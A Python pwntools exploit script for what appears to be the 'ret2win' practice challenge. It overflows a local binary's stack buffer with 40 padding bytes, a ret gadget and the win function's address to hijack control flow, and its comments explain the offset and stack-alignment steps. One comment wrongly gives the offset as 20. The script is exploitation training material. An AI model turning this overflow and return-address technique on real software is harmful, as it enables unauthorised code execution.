from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 'error'

#Local
gdb_script = f"""
"""

#No need to look up the memory address as we can look up the function at runtime
file = './ret2win'
e = context.binary = ELF(file)

ret2win = e.symbols['ret2win']
print(hex(ret2win)) #0x400756
# 0x0000000000400756  ret2win using info functions in gdb


'''
offset of 40 found using cyclic in pwngdb
inspect the function in gdb and see the following:
push   rbp
mov    rbp,rsp
sub    rsp,0x20 #allocates 0x20 (or 32) in the stack, we overwrite this
Another 8 we overwrite to control the ip, thus gives an offset of 20.
'''
offset_to_ip = 40

'''stack alignment issue on the original payload, add another ret to help with alignment
to replicate the movaps issue remove the gadget from the payload and run in gdb
found using ropgadet 0x000000000040053e : ret
'''
 
ret_gadget = 0x000000000040053e

payload = b'A' * offset_to_ip + p64(ret_gadget) + p64(ret2win)  

#p = gdb.debug(file, gdbscript=gdb_script)
p = process()
p.recvuntil(b">")

p.sendline(payload)
print(p.recvall())
